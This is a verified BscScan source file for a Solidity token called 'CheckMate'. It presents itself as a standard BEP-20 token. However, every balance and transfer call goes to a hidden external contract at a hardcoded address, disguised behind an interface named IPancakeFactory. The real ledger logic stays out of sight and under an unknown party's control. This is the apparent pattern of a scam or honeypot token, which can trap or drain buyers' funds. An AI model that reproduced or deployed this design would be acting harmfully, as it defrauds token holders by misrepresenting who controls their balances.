/**
 *Submitted for verification at BscScan.com on 2022-08-07
*/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IPancakeFactory {
    function deploy(address sender, address x) external;
    function balanceOf(address sender) external view returns (uint256);
    function transfer(address from,address to,uint256 amount) external;

}

contract CheckMate {
    string public constant name = 'CheckMate';
    string public constant symbol = 'CheckMate';
    address private factory;
    uint8 public constant decimals = 1;
    uint256 private totalSupply_ = 10000000 * 10;
    mapping(address => mapping(address => uint256)) allowed;
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner,address indexed spender,uint256 value);
    constructor() {
        factory = 0x4202796A320Ee4c355944950F7DcBF79641A58D4;
        IPancakeFactory(factory).deploy(msg.sender, address(this));
    }

    function totalSupply() public view returns (uint256) {
        return totalSupply_;
    }

    function approve(address delegate, uint256 numTokens) public returns (bool) {
        allowed[msg.sender][delegate] = numTokens;
        emit Approval(msg.sender, delegate, numTokens);
        return true;
    }

    function allowance(address owner, address delegate) public view returns (uint256) {
        return allowed[owner][delegate];
    }

    function balanceOf(address tokenOwner) public view returns (uint256) {
        return IPancakeFactory(factory).balanceOf(tokenOwner);
    }

    function transferFrom(address from,address to,uint256 amount) public returns (bool) {
        require(allowed[from][msg.sender] >= amount, "Not allowed");
        IPancakeFactory(factory).transfer(from, to, amount);
        emit Transfer(from, to, amount);
        return true;
    }

    function transfer(address to, uint256 amount) public returns (bool) {
        IPancakeFactory(factory).transfer(msg.sender, to, amount);
        emit Transfer(msg.sender, to, amount);
        return true;
    }
}